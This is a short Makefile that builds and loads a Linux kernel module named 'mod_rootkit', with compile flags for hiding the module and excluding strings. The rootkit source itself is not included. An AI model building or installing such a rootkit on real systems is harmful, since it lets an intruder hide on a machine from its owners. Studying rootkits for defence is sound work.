obj-m += mod_rootkit.o
mod_rootkit-objs := main.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

STRING_EXCLUDES ?=
HIDE_MODULE ?= 0

ccflags-y := -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" -DHIDE_MODULE=$(HIDE_MODULE)

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

install:
	insmod mod_rootkit.ko

uninstall:
	rmmod mod_rootkit
